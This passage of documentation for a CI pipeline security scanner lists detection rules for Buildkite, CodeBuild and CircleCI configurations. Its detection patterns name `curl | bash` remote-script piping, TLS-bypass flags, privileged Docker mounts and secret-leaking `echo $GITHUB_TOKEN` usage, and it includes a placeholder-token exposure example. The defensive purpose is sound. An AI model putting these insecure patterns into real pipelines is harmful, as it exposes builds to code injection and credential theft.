**Evidences:** [`2.2.2`](#ctrl-2-2-2) Ensure build workers are single-use.

**How this is detected.** Buildkite has no implicit timeout; agents will wait forever. Set ``timeout_in_minutes:`` per step. The pipeline-level default counts, a global ``steps:`` block with ``timeout_in_minutes:`` is fine, since Buildkite copies it to each step.

**Recommendation.** Set ``timeout_in_minutes:`` on every command step. A compromised dependency or a hung test can otherwise hold an agent indefinitely, blocking parallel pipelines and running up self-hosted-runner cost. Pick a value generous enough for the slowest legitimate run (e.g. 30 for a typical build, 90 for an integration suite).

**Known false positives.**

- Steps that genuinely need >24h (rare; database migrations, ML training jobs), set ``timeout_in_minutes: 1440`` explicitly so the absence of a timeout is intentional.

**Source:** [`BK-006`](../providers/buildkite.md#bk-006) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-007`: Deploy step not gated by a manual block / input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-007 }

**Evidences:** [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution, [`5.1.4`](#ctrl-5-1-4) Ensure deployment configuration manifests are reviewed before apply.

**How this is detected.** A step is treated as a deploy when its label, key, or any command line contains a deploy keyword (``deploy``, ``ship``, ``release``, ``promote``, ``apply``, ``rollout``, ``terraform apply``, ``kubectl apply``, ``helm upgrade``, ``aws ecs update-service``). The check passes when at least one preceding step in the same pipeline file is a ``block:`` or ``input:`` flow-control step.

**Recommendation.** Insert a ``- block: "Deploy?"`` (or ``- input:`` step) in front of every deploy step. Buildkite waits for a human to click *Unblock* before the gated steps run, which prevents an unreviewed merge from auto-deploying to production. Combine with ``branches: main`` so the gate only appears on release branches.

**Known false positives.**

- Pipelines where the deploy gate lives in a triggered pipeline rather than the local file, the local pipeline looks ungated even though the actual deploy is gated downstream. Add a no-op ``block:`` to silence.

**Source:** [`BK-007`](../providers/buildkite.md#bk-007) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-008`: TLS verification disabled in step command <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-008 }

**Evidences:** [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Detection fires on the canonical bypass flags across curl, wget, git, npm, pip, gcloud, and openssl. The check is deliberately conservative, partial-word matches (``--insecure-protocols``) are excluded.

**Recommendation.** Drop ``curl -k`` / ``--insecure``, ``wget --no-check-certificate``, ``git -c http.sslVerify=false``, and ``pip install --trusted-host``. If a CA isn't trusted, install it into the agent's trust store (``update-ca-certificates``) rather than disabling validation pipeline-wide. A compromised intermediate that strips TLS gets a free hand with every fetch the step performs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-008`](../providers/buildkite.md#bk-008) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-009 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.

**Recommendation.** Add a signing step, install cosign once (``brew install cosign`` in the agent image, or a ``cosign-install`` plugin) and call ``cosign sign --yes <ref>`` after the build. For container images pushed to ECR / GCR / GHCR, the same call signs by digest. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`BK-009`](../providers/buildkite.md#bk-009) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-010 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog, syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool.

**Recommendation.** Add an SBOM-generation step. ``syft <artifact> -o cyclonedx-json > sbom.json`` runs in any standard agent image; ``cyclonedx-cli`` and ``cdxgen`` are alternative producers. Upload the SBOM via ``buildkite-agent artifact upload`` so downstream consumers (and incident-response tooling) can match deployed artifacts to the components they were built from.

**Source:** [`BK-010`](../providers/buildkite.md#bk-010) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-011 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked), [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Without it, a leaked signing key forges identity but a leaked build environment also forges provenance. You need both for the SLSA L3 non-falsifiability guarantee. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``attest-build-provenance``).

**Recommendation.** Run ``cosign attest --predicate slsa.json`` (or the SLSA-framework generator from a build-time step) after the build completes. The predicate records the build inputs and the agent that produced the artifact. Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`BK-011`](../providers/buildkite.md#bk-011) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-012 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers ``does this artifact ship a known CVE?`` rather than ``can we verify what it is?``. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, anchore, dependency-check, checkov, semgrep.

**Recommendation.** Add a vulnerability scanner, ``trivy fs .`` for source / filesystem, ``trivy image <ref>`` for container images, ``grype`` and ``snyk`` for either. Add ``npm audit`` / ``pip-audit`` for language-specific dep audits. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`BK-012`](../providers/buildkite.md#bk-012) in the [Buildkite provider](../providers/buildkite.md).

#### `CB-001`: Secrets in plaintext environment variables <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-001 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data, [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** Flags a plaintext env var when either (a) its **name** matches a secret-like pattern (PASSWORD, TOKEN, API_KEY, ...) or (b) its **value** matches a known credential shape (AKIA/ASIA access keys, GitHub tokens, Slack xox* tokens, JWTs). Plaintext values are visible in the AWS console, CloudTrail, and build logs to anyone with read access.

**Recommendation.** Move secrets to AWS Secrets Manager or SSM Parameter Store and reference them using type SECRETS_MANAGER or PARAMETER_STORE in the CodeBuild environment variable configuration.

**Proof of exploit.**

# Vulnerable: CodeBuild project with a plaintext PAT in env.
{
  "name": "deploy",
  "environment": {
    "environmentVariables": [
      {"name": "GITHUB_TOKEN",
       "value": "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
       "type": "PLAINTEXT"}
    ]
  }
}

# Exposure surface (no exploit needed, the value just leaks):
#  - codebuild:BatchGetProjects returns the value to anyone with
#    that permission (often broader than `codebuild:StartBuild`).
#  - CloudTrail's UpdateProject / CreateProject events record
#    the full env block in audit logs.
#  - The buildspec can ``echo $GITHUB_TOKEN`` and the value
#    lands in the build log group, readable by anyone with
#    logs:GetLogEvents on the group.
#  - The AWS console shows the value to anyone with project
#    read access; no separate decrypt permission gates it.

# Safe: reference Secrets Manager / SSM, never store the
# plaintext on the project.
{
  "name": "deploy",
  "environment": {
    "environmentVariables": [
      {"name": "GITHUB_TOKEN",
       "value": "arn:aws:secretsmanager:us-east-1:111111111111:secret:gh-pat-AbCdEf",
       "type": "SECRETS_MANAGER"}
    ]
  }
}

**Source:** [`CB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-002`: Privileged mode enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-002 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.1.6`](#ctrl-2-1-6) Ensure build workers have minimal network connectivity.

**How this is detected.** Privileged mode grants the build container root access to the host's Docker daemon. A compromised build can escape the container or tamper with the host. Only flip this on for real Docker-in-Docker workloads and keep the buildspec under branch-protected review.

**Recommendation.** Disable privileged mode unless the project explicitly requires Docker-in-Docker builds. If required, ensure the buildspec is tightly controlled, peer-reviewed, and sourced from a trusted repository with branch protection.

**Source:** [`CB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-003`: Build logging not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-003 }

**Evidences:** [`2.3.7`](#ctrl-2-3-7) Ensure pipeline steps produce audit logs.

**How this is detected.** A CodeBuild project with neither CloudWatch Logs nor S3 logging enabled leaves no durable record of what the build did. The CodeBuild console shows the last execution's logs for a short retention window, but anything older, and any automated review of historical activity during incident response, is gone.

**Recommendation.** Enable CloudWatch Logs or S3 logging in the CodeBuild project configuration to maintain a durable audit trail of all build activity.

**Source:** [`CB-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-004`: No build timeout configured <span class="pg-sev pg-sev--low">LOW</span> { #detail-cb-004 }

**Evidences:** [`2.2.2`](#ctrl-2-2-2) Ensure build workers are single-use.

**How this is detected.** A CodeBuild project at AWS's 480-minute maximum is rarely deliberate. Without a tighter ceiling, a runaway test loop, a fork-PR cryptomining payload, or a build that hangs on stdin keeps the build host (and its IAM role) live for the full eight hours, racking up cost and extending the compromise window.

**Recommendation.** Set a build timeout appropriate for your expected build duration (typically 15–60 minutes) to limit the blast radius of a runaway or abused build.

**Source:** [`CB-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-005`: Outdated managed build image <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-005 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Only AWS-managed ``aws/codebuild/standard:N.0`` images are version-checked. Custom or third-party images pass here, CB-009 handles the separate concern of tag vs digest pinning for custom images.

**Recommendation.** Update the CodeBuild environment image to aws/codebuild/standard:7.0 or later to ensure the build environment receives the latest security patches.

**Known false positives.**

- One version behind the current ``aws/codebuild/standard`` is a hygiene warning, not a production issue, and defaults to MEDIUM confidence. The rule emits HIGH only when the project is two or more versions behind. Custom or third-party images are not version-checked here; CB-009 handles tag-vs-digest pinning for those.

**Source:** [`CB-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-006`: CodeBuild source auth uses long-lived token <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-006 }

**Evidences:** [`1.3.4`](#ctrl-1-3-4) Ensure organization identity is required for contribution (no long-lived personal tokens).

**How this is detected.** OAUTH / PERSONAL_ACCESS_TOKEN / BASIC_AUTH source credentials are stored long-lived on the account and used by every CodeBuild project that points at the SCM provider. Rotating the upstream PAT requires manual re-credentialing here too. CodeConnections (CodeStar) is the AWS-managed alternative with token refresh and revocation.

**Recommendation.** Switch to an AWS CodeConnections (CodeStar) connection and reference it from the source configuration. Delete any stored source credentials of type OAUTH, PERSONAL_ACCESS_TOKEN, or BASIC_AUTH via delete_source_credentials.

**Source:** [`CB-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-007`: CodeBuild webhook has no filter group <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-007 }

**Evidences:** [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** A CodeBuild webhook with no filter groups fires on every push and every PR from any actor, including fork PRs from outside the org. Anyone able to open a PR triggers the build with whatever IAM authority the project's role carries. Filter groups (branch + actor + event type) are the gate.

**Recommendation.** Define filter groups restricting triggers to specific branches, actors, and event types.

**Source:** [`CB-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CC-001`: Orb not pinned to exact semver <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Orb references in the `orbs:` block must include an `@x.y.z` suffix to lock a specific version. References without `@`, with `@volatile`, or with only a major (`@1`) or major.minor (`@5.1`) version float and can silently pull in malicious updates.

**Recommendation.** Pin every orb to an exact semver version (`circleci/node@5.1.0`). Floating references like `@volatile`, `@1`, or bare names without `@` resolve to whatever is latest at build time, allowing a compromised orb update to execute in the pipeline.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-001`](../providers/circleci.md#cc-001) in the [CircleCI provider](../providers/circleci.md).

#### `CC-002`: Script injection via untrusted environment variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-002 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** CircleCI exposes environment variables like `$CIRCLE_BRANCH`, `$CIRCLE_TAG`, and `$CIRCLE_PR_NUMBER` that are controlled by the event source (branch name, tag, PR). Interpolating them unquoted into `run:` commands allows shell injection via specially crafted branch or tag names.

**Recommendation.** Do not interpolate attacker-controllable environment variables (CIRCLE_BRANCH, CIRCLE_TAG, CIRCLE_PR_NUMBER, etc.) directly into shell commands. Pass them through an intermediate variable and quote them, or use CircleCI pipeline parameters instead.

**Source:** [`CC-002`](../providers/circleci.md#cc-002) in the [CircleCI provider](../providers/circleci.md).

#### `CC-003`: Docker image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-003 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Docker images referenced in `docker:` blocks under jobs or executors must include an `@sha256:...` digest suffix. Tag-only references (`:latest`, `:18`) are mutable and can be replaced at any time by whoever controls the upstream registry.

**Recommendation.** Pin every Docker image to its sha256 digest: `cimg/node:18@sha256:abc123...`. Tags like `:latest` or `:18` are mutable, a registry compromise or upstream push silently replaces the image content.

**Source:** [`CC-003`](../providers/circleci.md#cc-003) in the [CircleCI provider](../providers/circleci.md).

#### `CC-004`: Secret-like environment variable not managed via context <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-004 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data, [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** Jobs that declare environment variables with secret-looking names (containing PASSWORD, TOKEN, SECRET, or API_KEY) in inline `environment:` blocks bypass CircleCI's context restrictions, security groups, OIDC claims, and audit logs are only enforced when secrets live in contexts.

**Recommendation.** Move secret-like variables (PASSWORD, TOKEN, SECRET, API_KEY) into a CircleCI context and reference the context in the workflow job configuration. Contexts support security groups and audit logging that inline `environment:` blocks lack.

**Source:** [`CC-004`](../providers/circleci.md#cc-004) in the [CircleCI provider](../providers/circleci.md).

#### `CC-005`: AWS auth uses long-lived access keys in environment block <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-005 }

**Evidences:** [`1.3.4`](#ctrl-1-3-4) Ensure organization identity is required for contribution (no long-lived personal tokens).

**How this is detected.** Long-lived AWS access keys declared directly in a job's `environment:` block are visible to anyone who can read the config. They cannot be rotated automatically and remain valid until manually revoked. OIDC-based federation yields short-lived credentials per build.

**Recommendation.** Remove AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from the job `environment:` block. Use CircleCI's OIDC token with `aws-cli/setup` orb's role-based auth, or store credentials in a context with security group restrictions.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-005`](../providers/circleci.md#cc-005) in the [CircleCI provider](../providers/circleci.md).

#### `CC-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-006 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step to the pipeline, e.g. install cosign and run `cosign sign`, or use the `sigstore` CLI. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`CC-006`](../providers/circleci.md#cc-006) in the [CircleCI provider](../providers/circleci.md).

#### `CC-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-007 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the build artifacts so consumers can ingest it into their vulnerability management pipeline.

**Source:** [`CC-007`](../providers/circleci.md#cc-007) in the [CircleCI provider](../providers/circleci.md).

#### `CC-008`: Credential-shaped literal in config body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-008 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data, [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** Every string in the config is scanned against a set of credential patterns (AWS access keys, GitHub tokens, Slack tokens, JWTs, Stripe, Google, Anthropic, etc.). A match means a secret was pasted into YAML, the value is visible in every fork and every build log and must be treated as compromised.

**Recommendation.** Rotate the exposed credential immediately. Move the value to a CircleCI project environment variable or a context and reference it via the variable name. For cloud access, prefer OIDC federation over long-lived keys.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`CC-008`](../providers/circleci.md#cc-008) in the [CircleCI provider](../providers/circleci.md).

#### `CC-009`: Deploy job missing manual approval gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-009 }

**Evidences:** [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution, [`5.1.4`](#ctrl-5-1-4) Ensure deployment configuration manifests are reviewed before apply.

**How this is detected.** In CircleCI, manual approval is implemented by adding a job with `type: approval` to the workflow and making the deploy job require it. Without this gate, any push to the triggering branch deploys immediately with no human review.

**Recommendation.** Add a `type: approval` job that precedes the deploy job in the workflow, and list it in the deploy job's `requires:`. This ensures a human must click Approve in the CircleCI UI before production changes roll out.

**Source:** [`CC-009`](../providers/circleci.md#cc-009) in the [CircleCI provider](../providers/circleci.md).

#### `CC-010`: Self-hosted runner without ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-010 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.1.6`](#ctrl-2-1-6) Ensure build workers have minimal network connectivity.

**How this is detected.** Self-hosted runners that persist between jobs leak filesystem and process state. A PR-triggered job writes to `/tmp`; a subsequent prod-deploy job on the same runner reads it. The check looks for `resource_class` values containing 'self-hosted', if found, it checks for 'ephemeral' in the value. Also checks for `machine: true` combined with a self-hosted resource class.

**Recommendation.** Configure self-hosted runners to tear down between jobs. Use a `resource_class` value that includes an ephemeral marker, or use CircleCI's machine executor with runner auto-scaling so each job gets a fresh environment.

**Source:** [`CC-010`](../providers/circleci.md#cc-010) in the [CircleCI provider](../providers/circleci.md).

#### `CC-011`: No store_test_results step (test results not archived) <span class="pg-sev pg-sev--low">LOW</span> { #detail-cc-011 }

**Evidences:** [`2.3.7`](#ctrl-2-3-7) Ensure pipeline steps produce audit logs.

**How this is detected.** Without `store_test_results`, test output is only available in the raw build log. Archiving test results enables CircleCI's test insights, timing-based splitting, and provides an audit trail that links each build to its test outcomes.

**Recommendation.** Add a `store_test_results` step to jobs that run tests. This archives test results in CircleCI for traceability, trend analysis, and debugging flaky tests.

**Source:** [`CC-011`](../providers/circleci.md#cc-011) in the [CircleCI provider](../providers/circleci.md).

#### `CC-012`: Dynamic config via `setup: true` enables code injection <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-012 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** When `setup: true` is set at the top level, the config becomes a setup workflow. It generates the real pipeline config dynamically (typically via the `circleci/continuation` orb). An attacker who controls the setup job (e.g. via a malicious PR in a fork) can inject arbitrary config for all subsequent jobs, including deploy steps with production secrets.

**Recommendation.** If `setup: true` is required, restrict the setup job to a trusted branch filter and audit the generated config carefully. Ensure the continuation orb's `configuration_path` points to a checked-in file, not a dynamically generated one that could be influenced by PR content.

**Source:** [`CC-012`](../providers/circleci.md#cc-012) in the [CircleCI provider](../providers/circleci.md).

#### `CC-013`: Deploy job in workflow has no branch filter <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-013 }

**Evidences:** [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** Without branch filters, a deploy job triggers on every branch push, including feature branches and forks. Restricting sensitive jobs to specific branches limits the blast radius of a compromised commit.

**Recommendation.** Add `filters.branches.only` to deploy-like workflow jobs so they only run on protected branches (e.g. main, release/*).

**Source:** [`CC-013`](../providers/circleci.md#cc-013) in the [CircleCI provider](../providers/circleci.md).

#### `CC-014`: Job missing `resource_class` declaration <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-014 }

**Evidences:** [`2.1.6`](#ctrl-2-1-6) Ensure build workers have minimal network connectivity.

**How this is detected.** Without an explicit `resource_class`, CircleCI assigns a default executor. Declaring the class documents the expected scope and prevents accidental use of larger (or self-hosted) executors that may have elevated privileges.

**Recommendation.** Add `resource_class:` to every job to explicitly control the executor size and capabilities. Use the smallest class that satisfies build requirements.

**Source:** [`CC-014`](../providers/circleci.md#cc-014) in the [CircleCI provider](../providers/circleci.md).

#### `CC-015`: No `no_output_timeout` configured <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-015 }

**Evidences:** [`2.2.2`](#ctrl-2-2-2) Ensure build workers are single-use.

**How this is detected.** Without `no_output_timeout`, a hung step can consume executor time indefinitely. Explicit timeouts cap cost and the window during which a compromised step has access to secrets and the build environment.

**Recommendation.** Add `no_output_timeout:` to long-running run steps, or set it at the job level. A reasonable default is 10-30 minutes. CircleCI's default of 10 minutes may be too long for some pipelines and absent for others.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-015`](../providers/circleci.md#cc-015) in the [CircleCI provider](../providers/circleci.md).

#### `CC-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-016 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a CircleCI config. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`CC-016`](../providers/circleci.md#cc-016) in the [CircleCI provider](../providers/circleci.md).

#### `CC-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-017 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a CircleCI config give the container full access to the runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-017`](../providers/circleci.md#cc-017) in the [CircleCI provider](../providers/circleci.md).

#### `CC-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-018 }

**Evidences:** [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a CircleCI config. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-018`](../providers/circleci.md#cc-018) in the [CircleCI provider](../providers/circleci.md).

#### `CC-019`: `add_ssh_keys` without fingerprint restriction <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-019 }

**Evidences:** [`1.3.4`](#ctrl-1-3-4) Ensure organization identity is required for contribution (no long-lived personal tokens).

**How this is detected.** A bare `- add_ssh_keys` step (without `fingerprints:`) loads every SSH key configured on the project into the job. This violates least privilege, the job gains access to keys it does not need, increasing the blast radius if the job is compromised.

**Recommendation.** Always specify `fingerprints:` when using `add_ssh_keys` to restrict which SSH keys are loaded into the job. A bare `add_ssh_keys` step loads ALL project SSH keys.

**Source:** [`CC-019`](../providers/circleci.md#cc-019) in the [CircleCI provider](../providers/circleci.md).

#### `CC-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-020 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`CC-020`](../providers/circleci.md#cc-020) in the [CircleCI provider](../providers/circleci.md).

#### `CC-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-021 }

**Evidences:** [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-021`](../providers/circleci.md#cc-021) in the [CircleCI provider](../providers/circleci.md).

